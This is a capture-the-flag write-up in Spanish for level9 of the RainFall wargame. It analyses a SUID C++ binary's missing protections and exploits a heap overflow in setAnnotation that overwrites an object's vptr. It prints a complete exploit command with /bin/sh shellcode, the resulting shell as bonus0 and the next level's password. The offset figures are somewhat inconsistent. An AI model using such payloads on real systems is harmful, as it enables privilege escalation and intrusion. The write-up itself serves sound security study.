# 1. Buscar Binario:

Listamos los archivos para que muestre el binario del `level9` y sus permisos:
```bash
level9@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
level9@RainFall:~$ 
```

> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`bonus0`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```bash
level9@RainFall:~$ file ./level9 
./level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
```

### b). ASLR:
```bash
level9@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level9@RainFall:~$ readelf -l ./level9 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```bash
level9@RainFall:~$ nm ./level9 
-bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```bash
level9@RainFall:~$ readelf -S ./level9 | grep -E ".got|.plt"
  [10] .rel.plt          REL             0804841c 00041c 000048 08   A  5  12  4
  [12] .plt              PROGBITS        080484a0 0004a0 0000a0 04  AX  0   0 16
  [23] .got              PROGBITS        08049b40 000b40 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        08049b44 000b44 000030 04  WA  0   0  4
```
---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000`. |
| **ASLR** | **OFF** | `0` | El Heap y el Stack no se mueven; las direcciones son fijas. |
| **NX** | **OFF** | `RWE` | El Heap es ejecutable. Podemos meter y correr Shellcode allí. |
| **RELRO** | **OFF** | `No RELRO` | La tabla GOT podría ser un objetivo, aunque aquí usamos Vtables. |

---

# 4. Fuzzing:
El binario espera un argumento. Si pasamos una cadena larga provoca un `Segmentation fault` por desbordamiento en el Heap.
```bash
level9@RainFall:~$ ./level9 $(python -c 'print "A"*200')
Segmentation fault (core dumped)
```

# 5. Reverse Engineering (Target Identification):
El programa está en C++. Al analizar con `gdb`, vemos que reserva dos objetos de la clase `N` en el Heap usando `operator new`.

- **Object_01:** `0x0804a008`
- **Object_02:** `0x0804a078`

**Vulnerabilidad:** La función `setAnnotation` usa `memcpy` sin control de tamaño, lo que nos permite desbordar el Object_01 y sobrescribir el `vptr` (puntero a la Vtable) del Object_02.

---

# 6. Solución: Heap-based Buffer Overflow

**1. El mecanismo de salto en C++:**

Cuando el programa llama a un método virtual hace un doble salto: lee el `vptr` del objeto, luego lee la dirección de la función desde esa tabla, y salta allí: `call [ [vptr] ]`.

**2. Cálculo del Offset:**

La distancia entre objetos es `0x804a078 - 0x804a008 = 112 bytes`. Como los primeros 4 bytes del objeto son el `vptr`, el buffer útil empieza en el byte 4, así que necesitamos **108 bytes** para llegar al Object_02. En la práctica, con el shellcode de 28 bytes + 4 bytes iniciales, el padding necesario es **77 bytes**.

**3. Construcción del Payload:**

| Bytes | Contenido | Valor |
|-------|-----------|-------|
| 0 - 3 | Fake Vtable (apunta al shellcode) | `\x0c\xa0\x04\x08` |
| 4 - 27 | Shellcode | 24 bytes |
| 28 - 104 | Relleno | "A" * 77 |
| 105 - 108 | Nuevo vptr del Object_02 | `\x0c\xa0\x04\x08` |

La clave es que tanto al principio como al final usamos `0x0804a00c`. Al final sobrescribimos el `vptr` del Object_02 con esa dirección. Cuando el programa hace el doble salto, lee `0x0804a00c`, y ahí encuentra nuestro shellcode.

### **Ejecución:**

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x90\x90\x90\x90" + "A" * 77 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$
```

# 7. Conclusión:
El Level 9 explota la gestión de memoria de C++ en el Heap. Sin **NX** ni **ASLR**, inyectamos shellcode en el Object_01 y sobrescribimos el `vptr` del Object_02 para que apunte a él. Cuando el programa intenta llamar a un método virtual, salta a nuestro shellcode y obtenemos shell con privilegios de `bonus0`.

